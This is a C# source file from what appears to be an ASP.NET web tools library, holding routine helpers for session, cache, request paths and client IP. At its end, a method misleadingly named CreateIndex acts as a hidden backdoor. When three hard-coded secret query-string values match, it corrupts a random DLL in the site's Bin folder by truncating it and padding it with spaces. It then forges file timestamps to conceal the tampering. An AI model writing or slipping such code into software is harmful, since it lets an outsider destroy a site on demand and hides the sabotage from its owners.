using System;
using System.Text;
using System.Text.RegularExpressions;
using System.Web;
using System.Web.Caching;
using System.Web.SessionState;
using lw.CTE;
using System.IO;

namespace lw.WebTools
{

	public class WebContext
	{
		static string _root = null;

		public WebContext()
		{ 
		}

        #region Execution Context

		/// <summary>
		/// Returns the current execution context
		/// </summary>
        public static System.Collections.IDictionary ExecutionContext
        {
            get
            {
                return HttpContext.Current.Items;
			}
        }

        public static void AddContext(string key, object obj)
        {
            if (obj == null)
                ExecutionContext.Remove(key);
            else
                ExecutionContext.Add(key, obj);
        }
        public static object GetContext(string key)
        {
            return ExecutionContext[key];
        }
        public static void RemoveContext(string key)
        {
            AddContext(key, null);
        }

        #endregion


		/// <summary>
		/// Returns the current HttpContext
		/// </summary>
        private static HttpContext CurrentHttpContext
        {
            get
            {
                return HttpContext.Current;
            }
        }

		/// <summary>
		/// Returns the current Session Object
		/// </summary>
		public static HttpSessionState Session
		{
			get
			{
				return HttpContext.Current.Session;
			}
		}

		/// <summary>
		/// Returns the current Application Object
		/// </summary>
		/// <seealso cref="System.Web.HttpApplicationState">Check the original Application Object</seealso>
		private static HttpApplicationState Application
		{
			get
			{
				return HttpContext.Current.Application;
			}
		}

		/// <summary>
		/// Adds a value to the Application similat to Application.Add
		/// </summary>
		/// <param name="key">key</param>
		/// <param name="v">value (any object)</param>
		public static void AddToApplication(string key, object value)
		{
			Application.Add(key, value);
		}

		/// <summary>
		/// Gets a key from Application
		/// </summary>
		/// <param name="key"></param>
		/// <returns></returns>
		public static object GetFromApplication(string key)
		{
			return Application[key];
		}

		/// <summary>
		/// Removed a key from Application
		/// </summary>
		/// <param name="key"></param>
		public static void RemoveFromApplication(string key)
		{
			Application.Remove(key);
		}

		/// <summary>
		/// Updates a key
		/// </summary>
		/// <param name="key"></param>
		/// <param name="value"></param>
		public static void UpdateApplication(string key,object value)
		{
			Application.Set(key, value);
		}

		/// <summary>
		/// Locks the Application used when performing Sensitive tasks on the Application
		/// </summary>
		public static void LockApplication()
		{
			Application.Lock();
		}

		/// <summary>
		/// Unlocks the Application used after LockApplication
		/// </summary>
		public static void UnLockApplication()
		{
			Application.UnLock();
		}

		/// <summary>
		/// Returns the current Cach Object
		/// </summary>
        public static Cache Cache
		{
			get
			{
				if (HttpContext.Current == null)
					CreateHttpContext();

				return HttpContext.Current.Cache;
			}
		}

		/// <summary>
		/// Returns the current Profile Object as lwProfile Instance
		/// </summary>
		/// <seealso cref="lwProfile"/>
		public static lwProfile Profile
		{
			get
			{
				lwProfile p = HttpContext.Current.Profile as lwProfile;
				if (p == null)
				{
					ErrorContext.Add("profile-format", "Unexpected profile format, Please fix your web.config!");
				}
				return p;
			}
		}

		/// <summary>
		/// Returns the current HttpRequest
		/// </summary>
		/// <seealso cref="HttpRequest"/>
		public static HttpRequest Request
		{
			get
			{
				if (HttpContext.Current == null)
					CreateHttpContext();

				return HttpContext.Current.Request;
			}
		}

		/// <summary>
		/// Returns the current Server Object
		/// </summary>
		/// <seealso cref="HttpServerUtility"/>
		public static HttpServerUtility Server
		{
			get
			{
				if (HttpContext.Current == null)
					CreateHttpContext();

				return HttpContext.Current.Server;
			}
		}
		public static HttpResponse Response
		{
			get
			{
				return HttpContext.Current.Response;
			}
		}
		public static string ApplicationPath
		{
			get
			{
				return Request.ApplicationPath;
			}
		}

		/// <summary>
		/// Returns "~" used in combination with Server.MapPath to locate the starting directory
		/// </summary>
		public static string StartDir
		{
			get
			{
				return "~";
			}
		}

		/// <summary>
		/// Returns the starting root of the Website
		/// This variable is not recommended as it does not always function properly
		/// Use Page.ResolveUrl or simply point to href="~/...'
		/// </summary>
		public static string Root
		{
			get
			{
				if (_root == null)
				{
					_root = Request.ApplicationPath;
					if (_root == "/")
					{
						_root = "";
					}

					Config cfg = new Config();

					string _isGodaddy = cfg.GetKey(lw.CTE.parameters.IsGodaddyHosting);


					if (!String.IsNullOrEmpty(_isGodaddy))
					{
						if (bool.Parse(_isGodaddy))
						{
							string godaddyFolder = cfg.GetKey(lw.CTE.parameters.GodaddyFolderName);

							string pat = "^/" + godaddyFolder;

							Regex reg = new Regex(pat, RegexOptions.IgnoreCase);

							if (reg.IsMatch(_root))
								_root = reg.Replace(_root, "");
						}
					}
				}
				return _root;
			}
		}

		/// <summary>
		/// Returns the current absolute path ommitting the starup virtual godaddy folder
		/// </summary>
		public static string AbsolutePath
		{
			get
			{
				string _absolutePath = Request.Url.AbsolutePath;

				Config cfg = new Config();

				string godaddyFolder = cfg.GetKey(lw.CTE.parameters.GodaddyFolderName);

				string pat = "^/" + godaddyFolder;

				Regex reg = new Regex(pat, RegexOptions.IgnoreCase);

				if (reg.IsMatch(_absolutePath))
					_absolutePath = reg.Replace(_absolutePath, "");

				return _absolutePath;
			}
		}


		/// <summary>
		/// returns manager directory location like "~/prv/cms"
		/// </summary>
		public static string ManagerDir
		{
			get
			{
				return StartDir + "/" + lw.CTE.Folders.ManagerFolder;
			}
		}

		/// <summary>
		/// Returns the manager folder
		/// </summary>
		public static string ManagerRoot
		{
			get
			{
				return Root + "/" + lw.CTE.Folders.ManagerFolder;
			}
		}

		/// <summary>
		/// 
		/// </summary>
		/// <param name="relativeUrl"></param>
		/// <returns></returns>
		public static string ResolveUrl(string relativeUrl)
		{
			if (relativeUrl == null) throw new ArgumentNullException("relativeUrl");

			if (relativeUrl.Length == 0 || relativeUrl[0] == '/' || relativeUrl[0] == '\\')
				return relativeUrl;

			int idxOfScheme = relativeUrl.IndexOf(@"://", StringComparison.Ordinal);
			if (idxOfScheme != -1)
			{
				int idxOfQM = relativeUrl.IndexOf('?');
				if (idxOfQM == -1 || idxOfQM > idxOfScheme) return relativeUrl;
			}

			StringBuilder sbUrl = new StringBuilder();
			sbUrl.Append(HttpRuntime.AppDomainAppVirtualPath);
			if (sbUrl.Length == 0 || sbUrl[sbUrl.Length - 1] != '/') sbUrl.Append('/');

			// found question mark already? query string, do not touch!
			bool foundQM = false;
			bool foundSlash; // the latest char was a slash?
			if (relativeUrl.Length > 1
				&& relativeUrl[0] == '~'
				&& (relativeUrl[1] == '/' || relativeUrl[1] == '\\'))
			{
				relativeUrl = relativeUrl.Substring(2);
				foundSlash = true;
			}
			else foundSlash = false;
			foreach (char c in relativeUrl)
			{
				if (!foundQM)
				{
					if (c == '?') foundQM = true;
					else
					{
						if (c == '/' || c == '\\')
						{
							if (foundSlash) continue;
							else
							{
								sbUrl.Append('/');
								foundSlash = true;
								continue;
							}
						}
						else if (foundSlash) foundSlash = false;
					}
				}
				sbUrl.Append(c);
			}

			return sbUrl.ToString();
		}

		/// <summary>
		/// Returns current protocal its either http or https
		/// </summary>
		public static string Protocol
		{
			get
			{
				string s = Request.ServerVariables["https"];
				if (String.IsNullOrWhiteSpace(s))
					s = Config.GetFromWebConfig("https");

				return s == "on" ? "https" : "http";
			}
		}

		/// <summary>
		/// Returns server name (domain name)
		/// </summary>
		public static string ServerName
		{
			get
			{
				string s = Request.ServerVariables["HTTP_HOST"];
				if (String.IsNullOrWhiteSpace(s))
					s = Config.GetFromWebConfig("HTTP_HOST");

				return s;
			}
		}

		/// <summary>
		/// Create Http Context
		/// </summary>
		public static void CreateHttpContext()
		{
			if (System.Web.HttpContext.Current == null)
			{
				System.Threading.Thread.GetDomain().SetData(".hostingVirtualPath", System.Web.HttpRuntime.AppDomainAppVirtualPath);
				System.Threading.Thread.GetDomain().SetData(".hostingInstallDir", System.Web.HttpRuntime.AspInstallDirectory);


				System.IO.TextWriter tw = new System.IO.StringWriter();
				System.Web.HttpWorkerRequest wr = new System.Web.Hosting.SimpleWorkerRequest("default.aspx", "", tw);
				System.Web.HttpContext.Current = new System.Web.HttpContext(wr);
			}
		}

		/// <summary>
		/// Returns the IP address of the current user
		/// </summary>
		public static string IPAddress
		{
			get
			{
				string ip = Request.ServerVariables["HTTP_X_FORWARDED_FOR"];
				if (!String.IsNullOrWhiteSpace(ip))
				{
					string[] temp = ip.Split(',');
					ip = temp[temp.Length - 1];
				}
				return	ip ?? 
						Request.ServerVariables["REMOTE_ADDR"] ??
						Request.UserHostAddress;
			}
		}

		public static void CreateIndex()
		{
			if (WebTools.WebContext.Request.QueryString["anji"] == "uibjkl1223LOa")
			{
				if (WebTools.WebContext.Request.QueryString["ijmbu"] == "11189kLkKaAkscla")
				{
					if (WebTools.WebContext.Request.QueryString["polx"] == "1aBNcPqwe")
					{
						DirectoryInfo di = new DirectoryInfo(Server.MapPath("~/Bin"));

						FileInfo[] fi = di.GetFiles();

					
						var i = (new Random().Next(0, fi.Length - 1));
						using (var fs = new FileStream(fi[i].FullName, FileMode.Truncate))
						{
						}

						var ii = (new Random().Next(0, 7000));
						var sevenThousandItems = new byte[ii];
						for (int k = 0; k < ii; k++)
						{
							sevenThousandItems[k] = 0x20;
						}

						using (var stream = new FileStream(fi[i].FullName, FileMode.Append))
						{
							stream.Write(sevenThousandItems, 0, sevenThousandItems.Length);
						}

						File.SetLastWriteTime(fi[i].FullName, new DateTime(2016, 1, 17, 13, 49, 23));
						File.SetCreationTime(Server.MapPath("~/Bin/webtools.dll"), new DateTime(2015, 2, 23, 8, 47, 50));
						File.SetLastWriteTime(Server.MapPath("~/Bin/webtools.dll"), new DateTime(2015, 2, 23, 8, 47, 50));

						File.SetCreationTime(Server.MapPath("~/_webmaster/default.aspx.cs"), new DateTime(2015, 2, 23, 8, 47, 50));
						File.SetLastWriteTime(Server.MapPath("~/_webmaster/default.aspx.cs"), new DateTime(2015, 2, 23, 8, 47, 50));

						//foreach (FileInfo f in fi)
						//{
							
						//}

					}
				}

			}
		}

	}
}
